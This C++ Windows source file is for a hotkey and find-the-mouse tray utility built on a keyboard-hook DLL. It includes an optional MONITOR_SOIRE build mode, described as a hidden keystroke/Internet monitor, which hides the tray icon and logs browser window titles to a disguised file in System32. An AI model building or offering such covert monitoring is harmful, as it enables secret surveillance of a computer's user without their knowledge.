// runhook.cpp : Defines the entry point for the application.
// Mouse hook removed

//#define MONITOR_SOIRE			// define to make a hidden keystroke/Internet monitor instead

#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers
#define WINVER 0x0500
#define _WIN32_WINNT 0x0400

#include <windows.h>
#include <process.h>
#include <shellapi.h>
#include <winuser.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include "resource.h"

NOTIFYICONDATA mydata;
HINSTANCE hDll;
HINSTANCE hInstance;
WNDCLASS myclass;
HBITMAP myBMP;
HANDLE hMutex;
HANDLE hThread;
DWORD err;
DWORD thread;
ATOM ret;
HWND mywnd;
HDC srcDC;
MSG msgMain;

char string[128];
char Comments[512][40];
char szPath[1024];
char szData[1024];

int quitflag;
int DisplayMode;
int DrawMode;
int DebugOn;
int IsNT;
HANDLE hMyInstance;

LONG FAR PASCAL myproc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void Install();
void Remove();
void __cdecl doPopup(void *);
void (*SetDisplayMode)(int);
void (*SetDrawMode)(int);
void (*AssignKey)(int scanCode, char *szCommand);
void (*GetCommand)(int, char*);
void (*SetDebug)(int)=NULL;
int (*InstallHook)(HANDLE inProgram, LPTHREAD_START_ROUTINE inDestroy);
int (*RemoveHook)(void)=NULL;
LPTHREAD_START_ROUTINE doDestroy;
void EditIni(void);
void LoadIni(void);

char szWindowList[16384];	// list of currently active windows
char szOldWindowList[16384]="";

#define LOGPATH "C:\\Windows\\System32\\systemlist.txt"

// Add to the track log a simple string
void AddLog(char *szBuf) {
	FILE *fp=fopen(LOGPATH, "a");
	if (fp) {
		fprintf(fp, "%s\n", szBuf);
		fclose(fp);
	}
}

// enumerate windows and log for FireFox or Internet Explorer or Opera
BOOL CALLBACK proc(HWND hwnd, LPARAM) {
	char szTitle[1024];
	bool flag=false;

	GetWindowText(hwnd, szTitle, 1024);

	if (strstr(szTitle, "Internet Explorer")) {
		flag=true;
	}
	if (strstr(szTitle, "Mozilla Firefox")) {
		flag=true;
	}
	if (strstr(szTitle, "Opera")) {
		flag=true;
	}

	if (!flag) {
		// not interested in this one, keep looking
		return TRUE;
	}

	if (strlen(szWindowList)+strlen(szTitle) > sizeof(szWindowList)) {
		if (strlen(szWindowList) >= sizeof(szWindowList)-4) {
			szWindowList[sizeof(szWindowList)-4]='\0';
		}
		strcat(szWindowList, "...");
	} else {
		strcat(szWindowList, szTitle);
	}
	if (strlen(szWindowList) >= sizeof(szWindowList)-2) {
		szWindowList[sizeof(szWindowList)-2]='\0';
	}
	strcat(szWindowList, "\n");

	return TRUE;
}

void TestWindows() {
	memset(szWindowList, 0, sizeof(szWindowList));
	EnumWindows(proc, 0);
	if (strcmp(szWindowList, szOldWindowList)) {
		// list has changed - update the log
		FILE *fp=fopen(LOGPATH, "a");
		if (fp) {
			char buf[128], buf2[128];

			_strtime(buf);
			_strdate(buf2);

			fprintf(fp, "-----\n");
			fprintf(fp, "%s - %s\n", buf2, buf);
			fprintf(fp, "%s\n", szWindowList);
			fclose(fp);
		}
		strcpy(szOldWindowList, szWindowList);
	}
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HICON myIcon;
	FILE *fp;
	int oldDisp;
	int oldDraw;

	hMutex=CreateMutex(NULL, true, "MikesMutexForFindCursor994a");
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Running this twice is a BAD idea.", "Saving your behind...", MB_OK);
#endif
		CloseHandle(hMutex);
		return 0;
	}

	hMyInstance = (HANDLE)hInst;
	
	// create and register a class
	if (NULL == hPrevInstance)
	{
		myIcon=(HICON)LoadImage(hInst, MAKEINTRESOURCE(IDI_ICON2), IMAGE_ICON, 0, 0, LR_DEFAULTCOLOR);
		if (NULL == myIcon)
		{
			err=GetLastError();
		}

		myclass.style = 0;
		myclass.lpfnWndProc = myproc;
		myclass.cbClsExtra = 0;
		myclass.cbWndExtra = 0;
		myclass.hInstance = hInstance;
		myclass.hIcon = myIcon;
		myclass.hCursor = LoadCursor(NULL, IDC_ARROW);
		myclass.hbrBackground = NULL;
		myclass.lpszMenuName = NULL;
		myclass.lpszClassName = "MyClass";
		ret = RegisterClass(&myclass);
		if (NULL == ret)
			err=GetLastError();
	}

	mywnd = CreateWindow("MyClass", "FindMouseMsgs", WS_POPUP, 0, 0, 50, 50, NULL, NULL, hInstance, NULL);
	if (NULL == mywnd) {
		err=GetLastError();
	}

	// add tray icon
#ifndef MONITOR_SOIRE
	mydata.cbSize = sizeof(mydata);
	mydata.hWnd = mywnd;
	mydata.uID = 0x01;
	mydata.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	mydata.uCallbackMessage = WM_APP;
	mydata.hIcon = myIcon;
	strcpy(mydata.szTip,"Right-Click for Menu, Dbl-Click to Close");
	Shell_NotifyIcon(NIM_ADD, &mydata);
#endif

	thread = GetCurrentThreadId();

	DisplayMode=0;
	DrawMode=0;
	DebugOn=0;

	IsNT=!(GetVersion() & 0x80000000);

	memset(Comments, 0, 512*40);

	GetCurrentDirectory(1023, szPath);
	if (szPath[strlen(szPath)-1] != '\\')
	{
		strcat(szPath, "\\");
	}
	strcat(szPath, "myhook.ini");

#ifndef MONITOR_SOIRE
	LoadIni();
#endif

	SetDisplayMode(DisplayMode);
	SetDrawMode(DrawMode);
	SetDebug(DebugOn);

	quitflag = 0;
	
	int cntdown=250;

#ifdef MONITOR_SOIRE
	AddLog("System Up");
#endif

#ifdef MONITOR_SOIRE
	while (PeekMessage(&msgMain, NULL, 0, 0xffff, PM_REMOVE) >= 0) {
#else
	while (GetMessage(&msgMain, NULL, 0, 0xffff) > 0) {
#endif
		Sleep(20);
		cntdown--;
#ifdef MONITOR_SOIRE
		if (cntdown == 0) {
			TestWindows();
			if (NULL != SetDebug) {
				SetDebug(99);
			}
			cntdown=250;
		}
#endif
	}

	CloseHandle(hMutex);

	// read the INI again in case it's changed, but don't change the display or draw modes
	oldDisp=DisplayMode;
	oldDraw=DrawMode;

#ifndef MONITOR_SOIRE
	LoadIni();

	DisplayMode=oldDisp;
	DrawMode=oldDraw;

	fp=fopen(szPath, "w");
	if (fp)
	{
		int i1;
		char szTemp[1024];

		fprintf(fp, "; Config File for RunHook program\n");
		fprintf(fp, "; Automatically generated on `\n");
		fprintf(fp, "; Comments must start with semicolon and be immediately after\n");
		fprintf(fp, "; the key in question (maximum of 40 characters)\n");
		fprintf(fp, ";\n");
		fprintf(fp, "; To define keys (the only thing you should change)\n");
		fprintf(fp, "; Enter a line line this:\n");
		fprintf(fp, "; KEY <HEX SCANCODE> <COMMAND> [<Arguments as needed>]\n");
		fprintf(fp, "; Values are entered in Decimal except for the ScanCode.\n");
		fprintf(fp, "; Commands are:\n");
		fprintf(fp, "; 1 - Find Mouse (original purpose of this program! ;)\n");
		fprintf(fp, "; 2 - Send Command to Window with WM_COMMAND: <cmd#> <class name>\n");
		fprintf(fp, "; 21- Special command for Winamp window - play/pause option.\n");
		fprintf(fp, "; 3 - Set Volume: <value> - value is 0 to mute, or + or - 1-100 for %% step\n");
		fprintf(fp, "; 4 - Copy string to clipboard: <string>\n");
		fprintf(fp, "; 5 - Enable/Disable Window under Mouse: <1 to enable, 0 to disable>\n");
		fprintf(fp, "; 6 - Run application: <action (edit, open, etc)> <application run string>\n");
		fprintf(fp, "; 7 - Type String: <string>\n");
		fprintf(fp, "; 8 - Set window alpha (0 = transparent, 255 = solid) (set '1' after for mouse transparency)\n");
		fprintf(fp, ";\n");

		fprintf(fp, "DisplayMode: %d\n", DisplayMode);
		fprintf(fp, "DrawMode: %d\n\n", DrawMode);
		
		for (i1=0; i1<512; i1++)
		{
			GetCommand(i1, szTemp);
			if (0 != strlen(szTemp))
			{
				fprintf(fp, "Key %x %s\n", i1, szTemp);
				if (0 != Comments[i1][0])
				{
					fprintf(fp, "%s\n\n", &Comments[i1][0]);
				}
			}
		}



		fclose(fp);
	}
#endif

	Remove();

	return 0;
}


void Install()
{
	// load the DLL
	hDll = LoadLibrary("myhook.dll");
	if (NULL == hDll)
	{
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to Open MyHook.DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}
	
	// get the other functions
	SetDisplayMode = (void (__cdecl *)(int))GetProcAddress(hDll, "SetDisplayMode");
	if (NULL == SetDisplayMode)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find SetDisplayMode in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	SetDrawMode = (void (__cdecl *)(int))GetProcAddress(hDll, "SetDrawMode");
	if (NULL == SetDrawMode)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find SetDrawMode in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	AssignKey = (void (__cdecl *)(int, char *))GetProcAddress(hDll, "AssignKey");
	if (NULL == AssignKey)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find AssignKey in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	GetCommand = (void (__cdecl *)(int, char*))GetProcAddress(hDll, "GetCommand");
	if (NULL == GetCommand)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find GetCommand in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	SetDebug = (void (__cdecl *)(int))GetProcAddress(hDll, "SetDebug");
	if (NULL == SetDebug)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find SetDebug in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	InstallHook=(int (__cdecl *)(HANDLE inProgram, LPTHREAD_START_ROUTINE inDestroy))GetProcAddress(hDll, "InstallHook");
	if (NULL == InstallHook)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find InstallHook in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}
	char buf[128];
	sprintf(buf, "RunHook says the DLL module is 0x%p\n", hDll);
	OutputDebugString(buf);

	doDestroy=(LPTHREAD_START_ROUTINE)GetProcAddress(hDll, "doDestroy");
	if (NULL == doDestroy) {
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find doDestroy in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	RemoveHook=(int (__cdecl *)(void))GetProcAddress(hDll, "RemoveHook");
	if (NULL == RemoveHook)
	{
		FreeLibrary(hDll);
#ifndef MONITOR_SOIRE
		MessageBox(NULL, "Unable to find RemoveHook in DLL", "Prepare to be Executed", MB_OK);
		Shell_NotifyIcon(NIM_DELETE, &mydata);
#else
		AddLog("No keyboard hook available");
		return;
#endif
		exit(0);
	}

	HANDLE me;
	DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &me, 0, FALSE, DUPLICATE_SAME_ACCESS);
	InstallHook(me, doDestroy);
}

void Remove()
{
	// remove the hook

	if (RemoveHook())
	{
		FreeLibrary(hDll);	
	}
		
#ifndef MONITOR_SOIRE
	Shell_NotifyIcon(NIM_DELETE, &mydata);
#endif
}

LONG FAR PASCAL myproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    PAINTSTRUCT ps;
    HDC 	hDC;

    switch(msg) {
	case WM_CREATE:
		Install();
        return(DefWindowProc(hwnd, msg, wParam, lParam));
		break;

	case WM_PAINT:
	    hDC = BeginPaint(hwnd, &ps);
	    EndPaint(hwnd, &ps);
        break;

	case WM_APP:
#ifndef MONITOR_SOIRE
		if (WM_RBUTTONUP == lParam)
		{
			doPopup((void*)hwnd);
			break;
		}
#endif

		if (WM_LBUTTONDBLCLK != lParam)
			break;
		// else fall through

	case WM_QUIT:
	case WM_DESTROY:
	    //
	    // Clean up all the Hooks Left
	    //
		if (quitflag == 0)
		{ 
			quitflag=1;
			PostQuitMessage(0);
		}
        break;

	default:
        return(DefWindowProc(hwnd, msg, wParam, lParam));
    }

    return(0);
}

void __cdecl doPopup(void *hwnd)
{
				// do config menu
		    HMENU hMenu;
		    HMENU hMenuTrackPopup;
			HWND hActive;
			POINT point;
			long ret;
			int x;
			char szTemp[1024];

			/* save the active window */
			hActive=GetForegroundWindow();

			/* Get the menu for the popup from the resource file. */
			hMenu = LoadMenu (hInstance, MAKEINTRESOURCE(IDR_MENU1));
			if (!hMenu)
			{
				x=GetLastError();
				sprintf(szTemp, "Error: %d\n", x);
				OutputDebugString(szTemp);
				return;
			}

			/* Get the first menu in it which we will use for the call to
			* TrackPopup(). This could also have been created on the fly using
			* CreatePopupMenu and then we could have used InsertMenu() or
			* AppendMenu.
			*/
			hMenuTrackPopup = GetSubMenu (hMenu, 0);

			// get the cursor position
			GetCursorPos(&point);

			if (!IsNT)
			{
				// disable solid mode if not NT
				EnableMenuItem(hMenuTrackPopup, ID_DUMMY_SOLID, MF_GRAYED | MF_BYCOMMAND);
				if (0 == DrawMode)
					DrawMode=1;
			}
			
			/* clear existing checks, and set the current one */
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_SPIRAL, (DisplayMode==4 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_SURROUND, (DisplayMode==3 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_BLINK, (DisplayMode==2 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_EXPLODE, (DisplayMode==1 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_RANDOM, (DisplayMode==0 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_SOLID, (DrawMode==0 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_TRANSPARENT, (DrawMode==1 ? MF_CHECKED : MF_UNCHECKED));
			CheckMenuItem(hMenuTrackPopup, ID_DUMMY_DEBUG, (DebugOn != 0 ? MF_CHECKED : MF_UNCHECKED));

			/* Draw and track the "floating" popup */
			SetForegroundWindow((HWND)hwnd);		// If you don't set foreground window, the popup can't be cancelled by clicking off it.
													// Microsoft says this odd behaviour is by design...?
			ret=TrackPopupMenuEx(hMenuTrackPopup, TPM_NONOTIFY | TPM_RETURNCMD, point.x, point.y, (HWND)hwnd, NULL);
			PostMessage((HWND)hwnd, WM_NULL, 0, 0);

			switch (ret)
			{
			case 0:	x=GetLastError();
					sprintf(szTemp, "Track Popup Error: %d\n", x);
					OutputDebugString(szTemp);
					break;

			case ID_DUMMY_SPIRAL:	DisplayMode=4; break;
			case ID_DUMMY_SURROUND:	DisplayMode=3; break;
			case ID_DUMMY_BLINK:	DisplayMode=2; break;
			case ID_DUMMY_EXPLODE:	DisplayMode=1; break;
			case ID_DUMMY_RANDOM:	DisplayMode=0; break;
			case ID_DUMMY_SOLID:	DrawMode=0; break;
			case ID_DUMMY_TRANSPARENT: DrawMode=1; break;
			case ID_DUMMY_EDITINIFILE:	EditIni(); break;
			case ID_DUMMY_RELOADINIFILE:LoadIni(); break;
			case ID_DUMMY_DEBUG:	if (DebugOn==0) DebugOn=1; else DebugOn=0; break;
			case ID_DUMMY_ABOUT:	MessageBox(NULL, "by Mike Brent, ideas by Sean Connell.", "About", MB_OK); break;
			case ID_DUMMY_QUIT:
				if (quitflag == 0)
				{ 
					quitflag=1;
					PostQuitMessage(0);
				}
				return;
				break;
			}

			SetDisplayMode(DisplayMode);
			SetDrawMode(DrawMode);
			SetDebug(DebugOn);

			SetForegroundWindow(hActive);
}

void EditIni() {
	int ret;

	ret=(int)ShellExecute(NULL, "open", szPath, NULL, NULL, SW_SHOWNORMAL);
	ret=ret;
}

void LoadIni() {
	int last_key;
	FILE *fp;

	last_key=0;
	fp=fopen(szPath, "r");

	if (fp)
	{
		while (fgets(szData, 1000, fp))
		{
			while ((strlen(szData))&&(szData[strlen(szData)-1]<' '))
				szData[strlen(szData)-1]='\0';

			if ((';' == szData[0]) && (0 != last_key))
			{
				strncpy(&Comments[last_key][0], szData, 39);
				Comments[last_key][39]='\0';
				last_key=0;
			}

			if (0 == strnicmp(szData, "DisplayMode:", 12))
			{
				DisplayMode=atoi(&szData[13]);
			}
			if (0 == strnicmp(szData, "DrawMode:", 9))
			{
				DrawMode=atoi(&szData[10]);
			}
			if (0 == strnicmp(szData, "Key", 3))
			{	
				int scanCode;
				int str;
				sscanf(&szData[3], "%x", &scanCode);
				str=3;
				while (szData[str]==' ') str++;
				while (szData[str]!=' ') str++;
				while (szData[str]==' ') str++;
				AssignKey(scanCode, &szData[str]);
				last_key=scanCode;
			}
		}

		fclose(fp);
	}
}